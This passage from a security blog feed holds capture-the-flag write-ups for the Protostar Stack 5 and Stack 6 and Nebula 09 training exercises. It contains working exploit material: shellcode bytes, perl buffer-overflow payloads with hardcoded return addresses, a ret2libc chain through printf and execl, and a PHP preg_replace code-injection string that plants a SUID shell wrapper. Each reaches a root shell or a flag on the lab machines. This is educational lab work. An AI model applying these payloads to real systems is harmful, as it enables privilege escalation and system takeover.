&lt;p&gt;Yep, my 100 &amp;ldquo;C&amp;rdquo;s came through fine.  I definitely have some space if I need it.  So I simply used the start of the   &amp;ldquo;C&amp;rdquo;s as my return address, added a little bit of space with a 16 byte NOP sled, and then added shellcode (generated   from msfpayload with badchars taken out).  I wasn&amp;rsquo;t sure what the provided C code was doing yet, as I&amp;rsquo;m not really   a C developer, and figured I&amp;rsquo;d learn in time.  This was when I learned.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\xf0\xf7\xff\xbf&amp;quot; . &amp;quot;\x90&amp;quot;x16 . &amp;quot;\xdb\xc8\xd9\x74\x24\xf4\xba\x2a

\xa1\xa4\x48\x5d\x29\xc9\xb1\x10\x31\x55\x17\x83\xed\xfc\x03\x7f\xb2\x46\xbd\x4e\x7d\xb7\xe5\x47\x9e\x08\xbd\x6a

\xe1\x03\xb5\x2c\x7b\x81\xaf\xa4\x56\x45\xb9\xd3\xc1\xa6\xca\x73\x12\xd1\x03\xe1\x7b\x4f\xd5\x06\x29\x67\xed

\xc8\xce\x77\xc1\xaa\xa7\x19\x32\x59\x50\xe6\x1b\xce\x29\x07\x6e\x70\x18\x13\x1b\x71\x03\x6e\x5c&amp;quot;&#39; &amp;gt; 

/home/user/file
user@protostar:~$ ./stack6 &amp;lt; file
input path please: bzzzt (0xbffff7f0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the C code was actually making sure that the return address was not somewhere in the stack (starting with &amp;ldquo;\xbf&amp;rdquo;).  This is problematic, since my shellcode is in the stack, specifically near 0xbffff7f0. This means I had to learn how to get around this.&lt;/p&gt;

&lt;p&gt;I had heard of some of the fun buzzwords listed on the Stack6 page: ret2libc, and Return-Oriented Programming.  For   some reason, I didn&amp;rsquo;t make the connection between Return-Oriented Programming and the buzzword I&amp;rsquo;ve been seeing   everywhere, &amp;ldquo;ROP&amp;rdquo;.  Call me dumb, but I didn&amp;rsquo;t see it until mostly done with this.  I read a TON of sites, but some that I found useful were:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.corelan.be&#34;&gt;Corelan&lt;/a&gt; - These guys are geniuses. Watch some videos that corelanc0d3r gives. You&amp;rsquo;ll be amazed. And he also gave us &lt;a href=&#34;http://redmine.corelan.be/projects/mona&#34;&gt;mona.py&lt;/a&gt;, so he deserves praise.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.win.tue.nl/~aeb/linux/hh/hh-10.html&#34;&gt;Hackers Hut&lt;/a&gt; - This page was so useful for me getting execl working.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://sickness.tor.hu&#34;&gt;IHASOMGSECURITYSKILLS&lt;/a&gt; - If you&amp;rsquo;re ever on freenode in #offsec, you&amp;rsquo;ll often see sickn3ss there.  His linux exploitation guides are amazing&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So now I knew that I was going to need to at least use ret2libc, or maybe even ROP to call &amp;lsquo;execl(&amp;ldquo;/bin/bash&amp;rdquo;, &amp;ldquo;/bin/bash&amp;rdquo;, 0)&amp;rsquo;. I learned after experimenting quite a bit, that you can&amp;rsquo;t use &amp;lsquo;system(&amp;ldquo;/bin/bash&amp;rdquo;)&amp;rsquo;, because the call will lose the SUID permissions. I would get my bash shell, but it&amp;rsquo;d always have the same permissions as I already had. The next step would be to find out where in libc execl and other neccessary functions were stored in memory.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb ./stack6 --quiet
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) break main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) run
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, main (argc=1, argv=0xbffff844) at stack6/stack6.c:27
27      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) print printf
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7eddf90 &amp;lt;__printf&amp;gt;
(gdb) print execl
$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7f2e460 &amp;lt;*__GI_execl&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I looked up printf as well as execl, because with the help of the Hackers Hut link, I found that I could not pass a   &amp;ldquo;0&amp;rdquo; as an argument, so I needed to use a printf hack instead.  So my buffer overflow went from:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;| buffer (80) | return code | shellcode |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;to&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;| buffer (80) | printf | execl | formatstring | prg | prg | here |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To explain, I was still going to pass the 80 bytes to get to the EIP, but instead of jumping to the stack where my shellcode was stored, I would instead execute instructions.  Specifically &amp;lsquo;execl(prg, prg, 0)&amp;rsquo;, with a printf wrapper to bypass the &amp;ldquo;0&amp;rdquo; going into memory.  The &amp;ldquo;here&amp;rdquo; value is needs to have the value of the memory address it&amp;rsquo;s being entered to. For example, if &amp;ldquo;here&amp;rdquo; is located at 0xbfff0c14, it needs to contain the value 0xbfff0c14. It&amp;rsquo;s part of the printf hack.&lt;/p&gt;

&lt;p&gt;So now we have the buffer, the memory addresses of &amp;ldquo;printf&amp;rdquo; and &amp;ldquo;execl&amp;rdquo;.  Let&amp;rsquo;s put our format string and desired program together.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ export FORMATSTRING=&amp;quot;%3\$n&amp;quot;
user@protostar:~$ export FAV=&amp;quot;/home/user/fav&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;NOTE: When reading through the Hackers Hut article, it would make it sound like you could export the formatstring as &amp;ldquo;%3$n&amp;rdquo;, but bash tries to interpret the dollar sign, so I had to escape it with a backslash. Additionally, instead of calling the code from fav.c, I used the &lt;a href=&#34;http://www.exploit-db.com/exploits/13357&#34;&gt;shellcode&lt;/a&gt; I used in Stack 5, since it fixed the gets() issue.  I compiled it as &amp;ldquo;fav&amp;rdquo; for some reason.&lt;/p&gt;

&lt;p&gt;I then use a program that I found in the &lt;a href=&#34;http://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441&#34;&gt;Hacking: The Art of Exploitation&lt;/a&gt; book to get me the memory addresses of the environmental variables when called by a program.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc &amp;lt; 3) {
                printf(&amp;quot;Usage: %s &amp;lt;environment var&amp;gt; &amp;lt;target program name&amp;gt;\n&amp;quot;, argv[0]);
                exit(0);
        }

        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf(&amp;quot;%s will be at %p\n&amp;quot;, argv[1], ptr);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then called it to get the actual values&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ /home/user/getenvaddr FORMATSTRING ./stack6
FORMATSTRING will be at 0xbffff9a5
user@protostar:/opt/protostar/bin$ /home/user/getenvaddr FAV ./stack6
FAV will be at 0xbfffff5a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The last thing I needed, was the &amp;ldquo;here&amp;rdquo; memory address.  I took the source of stack6.c and compiled it to my home   directory, but with one small change.  I added a printf to show the location of the buffer in memory.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void getpath()
{
        char buffer[64];
        unsigned int ret;

        printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);

        gets(buffer);

        printf(&amp;quot;0x%08x\n&amp;quot;, buffer);

        ret = __builtin_return_address(0);

        if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
                printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
                _exit(1);
        }

        printf(&amp;quot;got path %s\n&amp;quot;, buffer);
}

int main(int argc, char **argv)
{
        getpath();



}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ gcc -fno-stack-protector -o stackx stack6.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Because of the stack being different because of the folder I was in, I navigated to where the real stack6.c was, and then ran my tests.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ cd /opt/protostar/bin/
user@protostar:/opt/protostar/bin$ /home/user/stackx
input path please: A
0xbffff75c
got path A
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I know the address of buffer in stackx was 0xbffff75c.  However, this won&amp;rsquo;t be exactly right for the real   version.  I then used gdb to see the changes.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb --quiet /home/user/stackx
Reading symbols from /home/user/stackx...(no debugging symbols found)...done.
(gdb) break getpath
Breakpoint 1 at 0x804848a
(gdb) run
Starting program: /home/user/stackx

Breakpoint 1, 0x0804848a in getpath ()
(gdb) x/4000s $esp
...
0xbffff977:      &amp;quot;/home/user/stackx&amp;quot;
...
0xbfffffea:      &amp;quot;/home/user/stackx&amp;quot;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the buffer was at 0xbfff75c, but there will be an offset. &amp;ldquo;/home/user/stackx&amp;rdquo; is 17 bytes long. &amp;ldquo;/opt/protostar/bin/stack6&amp;rdquo; is 25 bytes long. That&amp;rsquo;s a difference of 8 bytes. Since this is shown twice in memory, that&amp;rsquo;s a total of 16 bytes. We also will need to account for the 80 &amp;ldquo;A&amp;rdquo;s we&amp;rsquo;re putting in for the EIP offset, and   20 chars for the ret2libc commands.  So let&amp;rsquo;s add it up.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;printf(&amp;quot;0x%08x\n&amp;quot;, 0xbfff75c + 16 + 80 + 20)&#39;
0x0bfff7d0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So now we have all the info we need.  Again, we wanted to get to:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;| buffer (80) | printf | execl | formatstring | prg | prg | here |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I wired it all up together with the values that we received.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$cd /opt/protostar/bin
user@protostar:/opt/protostar/bin$perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x90\xdf\xed\xb7&amp;quot; . &amp;quot;\x60\xe4\xf2\xb7&amp;quot; . &amp;quot;\xa5\xf9\xff

\xbf&amp;quot; . &amp;quot;\x5a\xff\xff\xbf&amp;quot; . &amp;quot;\x5a\xff\xff\xbf&amp;quot; . &amp;quot;\xd0\xf7\xff\xbf&amp;quot;&#39; %gt; /home/user/file
user@protostar:/opt/protostar/bin$ ./stack6 &amp;lt; /home/user/file
input path please: got path 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒AAAAAAAAAAAA▒▒▒`▒▒▒▒▒Z▒▒▒Z▒▒▒▒▒▒▒
# whoami
root
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Stack 5</title>
      <link>https://www.mattandreko.com/blog/2011-12-17-exploit-exercises-protostar-stack-5/</link>
      <pubDate>Sat, 17 Dec 2011 12:23:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2011-12-17-exploit-exercises-protostar-stack-5/</guid>
      <description>&lt;p&gt;Wow, this challenge was a tough one for me.  I ran into some huge problems that I had to work out.  Considering this is a &amp;ldquo;standard buffer overflow&amp;rdquo;, I figured it&amp;rsquo;d be as easy as some of the others I&amp;rsquo;ve done in the past.  I&amp;rsquo;ll explain my frustrations inline.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;First, we&amp;rsquo;re given the following vulnerable program.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The first task with this challenge was to find the offset of the EIP.  Like previous challenges, I used &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&amp;rsquo;s&lt;/a&gt; pattern_create.rb and pattern_offset scripts on another machine.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 128
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae

user@protostar:/opt/protostar/bin$ gdb --quiet ./stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) run
Starting program: /opt/protostar/bin/stack5
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()

mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x63413563
76
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we know that we have 76 characters we could put our shellcode in before the EIP.  I was curious to see if we would have any after as well.  I wanted to explore a little, so I ran this.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x76 . &amp;quot;\xEF\xBE\xAD\xDE&amp;quot; . &amp;quot;C&amp;quot;x100&#39; | ./stack5
Segmentation fault (core dumped)

user@protostar:~$ gdb --core=/tmp/core.11.stack5.4174 --quiet
Core was generated by `./stack5&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0xdeadbeef in ?? ()
(gdb) x/10s $esp
0xbffff7e0:      &#39;C&#39; &amp;lt;repeats 100 times&amp;gt;
0xbffff845:      &amp;quot;b\377\267\233\333\352\267\364\357\377\267\001&amp;quot;
0xbffff852:      &amp;quot;&amp;quot;
0xbffff853:      &amp;quot;&amp;quot;
0xbffff854:      &amp;quot;\020\203\004\b&amp;quot;
0xbffff859:      &amp;quot;&amp;quot;
0xbffff85a:      &amp;quot;&amp;quot;
0xbffff85b:      &amp;quot;&amp;quot;
0xbffff85c:      &amp;quot;1\203\004\ba\004\b\001&amp;quot;
0xbffff866:      &amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Interestingly enough, it looks like we at least have 100 characters after our return address that we could use to store longer shellcodes.  This could come in handy if using shellcodes generated from msfpayload.&lt;/p&gt;

&lt;p&gt;So now we know that we can jump to 0xbffff7e0 to get into our C area.  Let&amp;rsquo;s pad it with a couple NOPs just in case, and jump to 0xbffff7d6 instead.&lt;/p&gt;

&lt;p&gt;Up until now, this was a simple buffer overflow problem.  One may even call it a textbook problem.  Now here&amp;rsquo;s the part that had me frustrated.&lt;/p&gt;

&lt;p&gt;I decided I would try using msfpayload to generate some shellcode like I&amp;rsquo;ve done many times in the past.  Since I just want to run /bin/sh, I figured it&amp;rsquo;d be an easy way.  I also went through the exercise of finding all the badchars (I&amp;rsquo;ll cover this later, since it doesn&amp;rsquo;t matter here).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msfvenom -p linux/x86/exec -f pl -b &#39;\x0d\x0a\x00\xff&#39; CMD=/bin/sh PrependSetresuid=true
[*] x86/shikata_ga_nai succeeded with size 80 (iteration=1)
my $buf =
&amp;quot;\xdb\xc8\xd9\x74\x24\xf4\xba\x2a\xa1\xa4\x48\x5d\x29\xc9&amp;quot; .
&amp;quot;\xb1\x10\x31\x55\x17\x83\xed\xfc\x03\x7f\xb2\x46\xbd\x4e&amp;quot; .
&amp;quot;\x7d\xb7\xe5\x47\x9e\x08\xbd\x6a\xe1\x03\xb5\x2c\x7b\x81&amp;quot; .
&amp;quot;\xaf\xa4\x56\x45\xb9\xd3\xc1\xa6\xca\x73\x12\xd1\x03\xe1&amp;quot; .
&amp;quot;\x7b\x4f\xd5\x06\x29\x67\xed\xc8\xce\x77\xc1\xaa\xa7\x19&amp;quot; .
&amp;quot;\x32\x59\x50\xe6\x1b\xce\x29\x07\x6e\x70\x18\x13\x1b\x71&amp;quot; .
&amp;quot;\x03\x6e\x5c&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This generated shellcode looked awesome.  I configured it to not have any of my badchars, to run &amp;ldquo;/bin/sh&amp;rdquo;, and to prepend that execution with a setresuid() so that the SUID bit would affect my result, giving me a root shell, instead of just a shell I already had.  So I set it all up:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x76 . &amp;quot;\xd6\xf7\xff\xbf&amp;quot; . &amp;quot;\x90&amp;quot;x16 . &amp;quot;\xdb\xc8\xd9\x74\x24\xf4\xba\x2a\xa1\xa4\x48\x5d\x29\xc9\xb1\x10\x31\x55\x17\x83\xed\xfc\x03\x7f\xb2\x46\xbd\x4e\x7d\xb7\xe5\x47\x9e\x08\xbd\x6a\xe1\x03\xb5\x2c\x7b\x81\xaf\xa4\x56\x45\xb9\xd3\xc1\xa6\xca\x73\x12\xd1\x03\xe1\x7b\x4f\xd5\x06\x29\x67\xed\xc8\xce\x77\xc1\xaa\xa7\x19\x32\x59\x50\xe6\x1b\xce\x29\x07\x6e\x70\x18\x13\x1b\x71\x03\x6e\x5c&amp;quot;&#39; &amp;gt; /home/user/file
user@protostar:~$ /opt/protostar/bin/stack5 &amp;lt; /home/user/file                  
user@protostar:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So um, I should have got a shell there right?  There was no segmentation fault, it ran cleanly.  I tinkered by putting &amp;ldquo;\xcc&amp;rdquo; before the shellcode, and it would give me a message letting me know that it hit it.  I knew for sure my shellcode was being executed, but no results.  To verify, I used gdb:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ sudo gdb --quiet /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) run &amp;lt; /home/user/file
Starting program: /opt/protostar/bin/stack5 &amp;lt; /home/user/file
Executing new program: /bin/dash

Program exited normally.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What this showed me was 2 interesting things.  Firstly, I was not aware that many distributions now map /bin/sh to /bin/dash (more info &lt;a href=&#34;https://wiki.ubuntu.com/DashAsBinSh&#34;&gt;here&lt;/a&gt;).  Secondly, and more importantly, I knew for sure that my shellcode was executing, and creating the process.  I just didn&amp;rsquo;t know why it exited after.&lt;/p&gt;

&lt;p&gt;So this is the point that I spent 5 days on and off messing with.  I found if I changed the msfvenom command from CMD=&amp;ldquo;/bin/sh&amp;rdquo; to CMD=&amp;ldquo;touch /tmp/iamawesome&amp;rdquo;, the file would be created with root permissions.  Any command that didn&amp;rsquo;t need to return to me for interactive control worked fine.  I tried a myriad of other shellcodes, and nothing just gave me a simple shell.  I could bind a shell to a TCP port, or run a meterpreter with no problem, but for this challenge, I just wanted a simple rootshell from &amp;ldquo;execve()&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;So one night, I was reading on this, and just happened to get my search query perfect, because I stumbled upon an interesting stackoverflow page, &lt;a href=&#34;http://stackoverflow.com/questions/2859127/shellcode-for-a-simple-stack-overflow-exploited-program-with-shell-terminates-d&#34;&gt;here&lt;/a&gt;.  This guy was having the same problem as me!  And interestingly enough, he mentions problems with programs that use the &amp;ldquo;gets()&amp;rdquo; function.  This makes sense, as your standard input/output could be configured in a mode just for the function call.  Unfortunately, the shellcode that was mentioned was hosted at milw0rm, which has been down for a good long time.  Many sites, such as &lt;a href=&#34;http://www.exploit-db.com&#34;&gt;Exploit-Db&lt;/a&gt; have popped up to fill the void that milw0rm left.  However, they use a completely different url structure, so I had no idea what the shellcode was.  Well, I used the &lt;a href=&#34;http://www.archive.org&#34;&gt;Internet Way-Back Machine&lt;/a&gt;, and found an old cache of milw0rm.  From there, I found the shellcode.  I also found that Exploit-Db has it &lt;a href=&#34;http://www.exploit-db.com/exploits/13357&#34;&gt;here&lt;/a&gt; as well.  I read through the description of the shellcode, and it makes tons of sense.  So I wire it up to try again, this time with the new shellcode.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x76 . &amp;quot;\xd6\xf7\xff\xbf&amp;quot; . &amp;quot;\x90&amp;quot;x16 . &amp;quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&amp;quot;&#39; &amp;gt; /home/user/file
user@protostar:~$ /opt/protostar/bin/stack5 &amp;lt; /home/user/file                   
# whoami
root
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome.  I have a root shell.  I guess it&amp;rsquo;s also worth pointing out that since we are specifically jumping to a memory address in our exploit, that memory addresses can change based on how you call it.  The address will be different if I call ./stack5 from inside the /opt/protostar/bin folder, than if I use the full path.  Since I was using gdb, and it calls files using the full path, I did it as well for the exploit.  For now, we have not yet covered how to dynamically get that value.  That will be for a later post.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 09</title>
      <link>https://www.mattandreko.com/blog/2011-12-10-exploit-exercises-nebula-09/</link>
      <pubDate>Sat, 10 Dec 2011 05:46:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2011-12-10-exploit-exercises-nebula-09/</guid>
      <description>&lt;p&gt;Challenge 09 gave me the most issues out of any other challenge so far.  This may just be because I haven&amp;rsquo;t touched PHP since version 3 was just coming out.  However, it is based on a dangerous function, known as &lt;a href=&#34;http://php.net/manual/en/function.preg-replace.php&#34;&gt;preg_replace()&lt;/a&gt;.  There are several more dangerous functions, some of which can be seen &lt;a href=&#34;http://stackoverflow.com/questions/3115559/exploitable-php-functions&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The challenge starts by giving us the source code of the program we will be exploiting.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What I noticed immediately, was that the program accepted 2 arguments, but never used the second one, other than to pass it into the &amp;ldquo;markup&amp;rdquo; function as &amp;ldquo;$use_me&amp;rdquo;.  This seemed odd, so I figured it had to do something with that.  I also thought at first that the &amp;ldquo;spam&amp;rdquo; function was never being called, but then noticed it in quotes on the first line of &amp;ldquo;preg_replace&amp;rdquo; statements.  I had to look this function up, and find out that it would evaluate the code at run-time.  This means that I needed to inject code into that call to &amp;ldquo;spam()&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;I tried doing some basic injection to try to get something equivelent to it calling:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;spam(&amp;quot;&amp;quot;);system(&amp;quot;/bin/bash&amp;quot;);print(&amp;quot;&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However this never worked, because of the &lt;a href=&#34;http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php&#34;&gt;PCRE modifiers&lt;/a&gt; built into PHP.  They automatically will escape single and double quotes, as well as backticks (at least according to the docs).  I spent &lt;b&gt;hours&lt;/b&gt; trying to inject various strings to get some sort of code execution.&lt;/p&gt;

&lt;p&gt;Somewhere along the line, I read a page (sorry I can&amp;rsquo;t seem to find it again) where they mentioned using an alternative syntax to the backreferences in preg_replace.  So instead of using \2, you could use ${2}.  This is covered slightly on the &lt;a href=&#34;http://php.net/manual/en/function.preg-replace.php&#34;&gt;preg_replace&lt;/a&gt; php function reference.  What that reference doesn&amp;rsquo;t show, is that you can apparently have that not just reference parameters, but any variable in the code.  After tinkering a while, I settled on a pattern.  I created a file named, /tmp/level09.txt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[email {${`$use_me`}}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Firstly, I had to start with &amp;ldquo;[email &amp;ldquo; and end with &amp;ldquo;]&amp;rdquo; to get it into this regex at all.  Because of the PCRE modifiers, I used back-ticks, because in researching them, I ran across a &lt;a href=&#34;http://www.madirish.net/node/437&#34;&gt;blog post&lt;/a&gt; saying that back-ticks were able to bypass them somehow.  So with variable expansion, and the PCRE modifier bypass, this should let me inject some code into the function.&lt;/p&gt;

&lt;p&gt;Because running a &amp;ldquo;system()&amp;rdquo; or &amp;ldquo;exec()&amp;rdquo; method in the php caused me problems with interactivity, I opted to use commands that required no interaction at run-time.  I again used my /tmp/bash_id.c file from challenge 07:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main(int argc, char *argv[])
{
    if (argc != 2)
        printf(&amp;quot;usage: %s &amp;lt;user id&amp;gt;\n&amp;quot;, argv[0]);
    else {
        int i = atoi(argv[1]);
        setresuid(i, i, i);
        setresgid(i, i, i);
        system( &amp;quot;/bin/bash&amp;quot; );
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then would call the compiled SUID version of the php file with 2 parameters.  The first would be the text file I wanted to parse, and the second would be the commands I wanted to run, which would get inserted into the $use_me variable.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level09@nebula:/home/flag09$ ./flag09 /tmp/level09.txt &amp;quot;gcc -o /home/flag09/bash_id /tmp/bash_id.c;chmod +s,a+rwx /home/flag09/bash_id&amp;quot;
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This compiled my bash_id.c source file to the flag09 user&amp;rsquo;s home directory, and marked it SUID.  I ignored the PHP Notice, since I knew I was tinkering.&lt;/p&gt;

&lt;p&gt;After making sure the bash_id program did get created properly, I just needed to call it with the userid of flag09 as the first parameter.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level09@nebula:/home/flag09$ ./bash_id `cat /etc/passwd | grep flag09 | cut -d : -f 3`
flag09@nebula:/home/flag09$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This apparently worked, so I ran the &amp;ldquo;getflag&amp;rdquo; command as usual, marking completion of this challenge.  This was by far the most guessing I&amp;rsquo;ve had to do on any of the challenges so far.  I really hope that I don&amp;rsquo;t get stuck soon, leaving me unable to continue on.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 07</title>
      <link>https://www.mattandreko.com/blog/2011-12-08-exploit-exercises-nebula-07/</link>
      <pubDate>Thu, 08 Dec 2011 06:10:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2011-12-08-exploit-exercises-nebula-07/</guid>
      <description>&lt;p&gt;This &lt;a href=&#34;http://exploit-exercises.com/nebula/level07&#34;&gt;next challenge&lt;/a&gt; is a little bit more tricky than some of the previous ones.  There&amp;rsquo;s a lot more code involved, but it&amp;rsquo;s not too bad.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In the flag07 home directory, you&amp;rsquo;ll find the configuration for a simple http server, thttpd.conf.  Inside, you&amp;rsquo;ll find that it&amp;rsquo;s running an HTTP server on port 7007 as the flag07 user.  This is where the perl script that is provided comes in.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub ping {
 $host = $_[0];

